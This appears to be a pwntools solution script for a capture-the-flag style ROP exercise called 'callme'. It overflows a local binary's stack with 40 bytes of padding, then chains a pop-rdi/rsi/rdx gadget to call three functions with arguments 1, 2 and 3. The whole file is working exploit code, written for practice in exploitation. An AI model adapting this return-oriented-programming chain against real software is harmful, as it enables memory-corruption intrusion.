from pwn import *

'''

0x00401850    1 6            sym.imp.callme_one
0x00401870    1 6            sym.imp.callme_two
0x00401810    1 6            sym.imp.callme_three

0x0000000000401ab0: pop rdi; pop rsi; pop rdx; ret; 
'''

def main():
	callme_one = 0x00401850
	callme_two = 0x00401870
	callme_three = 0x00401810
	pppr = 0x0000000000401ab0

	payload = 'A' * 40
	payload += p64(pppr)
	payload += p64(1)
	payload += p64(2)
	payload += p64(3)
	payload += p64(callme_one)
	payload += p64(pppr)
	payload += p64(1)
	payload += p64(2)
	payload += p64(3)
	payload += p64(callme_two)
	payload += p64(pppr)
	payload += p64(1)
	payload += p64(2)
	payload += p64(3)
	payload += p64(callme_three)
	
	p = process('callme')
	print p.recvrepeat(0.2)
	p.sendline(payload)
	print p.recvrepeat(0.2)

if __name__ == '__main__':
	main()
